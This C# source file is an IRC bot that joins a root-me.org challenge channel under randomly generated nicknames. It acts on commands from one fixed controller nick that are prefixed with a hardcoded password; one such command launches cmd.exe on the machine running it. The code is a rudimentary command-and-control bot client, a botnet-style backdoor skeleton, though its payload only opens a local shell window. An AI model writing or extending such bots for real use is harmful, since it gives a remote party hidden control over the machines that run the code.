using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Meebey.SmartIrc4net;

namespace Bot                       //https://www.root-me.org/spip.php?page=webirc&lang=en
{
    class Program
    {
        static IrcClient Irc = new IrcClient();
        const int port = 6667;
        static string ip = "irc.root-me.org";
        static string nick = GetName(3);
        static string realname = GetName(2) + nick;
        static string channel = "#root-me_challenge";

        static string serverName = "Paul_Wade";

    
        static void Main(string[] args)
        {
            Irc.Encoding = Encoding.UTF8;
            Irc.SendDelay = 200;
            Irc.ActiveChannelSyncing = true;
            Irc.OnRawMessage += Irc_OnRawMessage;
            Irc.OnQueryMessage += Irc_OnQueryMessage;
            Irc.OnErrorMessage += Irc_OnErrorMessage;
            if (Irc.GetChannelUser(channel, nick) == null) Connect();
            while (true)
            {
                string msg = Console.ReadLine();
                Irc.SendMessage(SendType.Message, channel, msg);
                Console.WriteLine(msg);
            }
            
        }

        private static void Irc_OnQueryMessage(object sender, IrcEventArgs e)
        {
            
        }

        private static /*async*/ void Irc_OnErrorMessage(object sender, IrcEventArgs e)
        {
            if (e.Data.Message == "Nickname is already in use.")
            {
                //    await Task.Run(()=>Irc.Disconnect());
                //    nick = GetName(3);
                //    Connect();
            }
            Console.WriteLine("ERROR: " + e.Data.Message);
        }

        private static void Irc_OnRawMessage(object sender, IrcEventArgs e)
        {
            try
            {
                if (serverName == e.Data.Nick && e.Data.MessageArray[0] == "myPassword" && e.Data.Nick != null && e.Data.MessageArray != null)
                {
                    switch (e.Data.MessageArray[1])
                    {
                        case "ping":
                            Console.WriteLine("{0}   {1}: {2}", DateTime.Now.TimeOfDay, e.Data.Nick, e.Data.MessageArray[1]);
                            break;
                        case "command1":
                            Process.Start(@"C:\Windows\system32\cmd.exe");
                            break;
                    }
                }
                else Console.WriteLine(e.Data.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static async void Connect()
        {
            Irc.Connect(ip, port);
            Irc.Login(nick, realname);
            Irc.RfcJoin(channel);
            await Task.Run(()=>Irc.Listen());
        }
        static string GetName(int iter)
        {
            string romanNames = @"-a
-al
-au +c
-an
-ba
-be
-bi
-br +v
-da
-di
-do
-du
-e
-eu +c
-fa
bi
be
bo
bu
nul +v
+tor
gu
da
au +c -c
fri
gus
+tus
+lus
+lius
+nus
+es
+ius -c
+cus
+cio
+tin
+ai
-ay
+ea
-ee
+ei
+ey
-eu
+ew
+ie
-oa
+oo
-ou
-bt
+ch
-ck
-dg
+gh
-gn
+gm
-kn
+mb
-mn
+ng
ph
sh
tch
th
wh
";

            StringReader rr = new StringReader(romanNames);
            NameGenerator nameGen = new NameGenerator(rr);
            rr.Close();
            for (int i = 0; i < 100; i++)
            {
                Console.WriteLine(nameGen.Compose(iter));
            }
            return nameGen.Compose(iter);
        }
    }
}
